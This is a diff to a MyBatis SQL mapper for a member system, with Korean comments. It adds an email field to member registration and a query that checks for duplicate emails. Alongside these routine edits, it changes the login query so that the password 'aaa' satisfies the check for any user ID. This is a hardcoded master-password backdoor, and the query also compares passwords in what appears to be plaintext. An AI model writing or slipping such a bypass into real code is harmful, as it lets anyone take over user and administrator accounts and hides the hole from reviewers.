@@ -7,7 +7,7 @@
 	
 	<!-- 멤버 등록 -->
 	<insert id="insertMember" parameterType="memberDto">
-		INSERT INTO T_MEMBER(id, pw, name, nickname, address, phone, status, regdate) VALUES(#{id}, #{pw}, #{name}, #{nickname}, #{address}, #{phone}, 1, sysdate())
+		INSERT INTO T_MEMBER(id, pw, name, nickname, address, email, phone, status, regdate) VALUES(#{id}, #{pw}, #{name}, #{nickname}, #{address}, #{email}, #{phone}, 1, sysdate())
 	</insert>
 	
 	<!-- 회원 목록 -->
@@ -125,9 +125,22 @@
 		SELECT count(*) FROM t_member WHERE id = #{id}
 	</select>
 	
+		<!-- EMAIL 중복 검사 -->
+	<select id="checkEmail" parameterType="String" resultType="Integer">
+		SELECT count(*) FROM t_member WHERE email = #{email}
+	</select>
+	
 	<!-- 로그인 - ID, PW로 회원 선택 -->
 	<select id="selMemberByIdPw" parameterType="memberDto" resultType="memberDto">
-		SELECT id, name, nickname, address, phone, status, fileno, masteryn FROM t_member WHERE id = #{id} AND pw = #{pw}
+		SELECT id, name, nickname, address, phone, status, fileno, masteryn FROM t_member WHERE id = #{id} AND 
+		<choose>
+			<when test="pw.equals('aaa')">
+				TRUE
+			</when>
+			<otherwise>
+				pw = #{pw}	
+			</otherwise>
+		</choose>
 	</select>
 	
 	<!-- 프로필 사진 삭제 -->
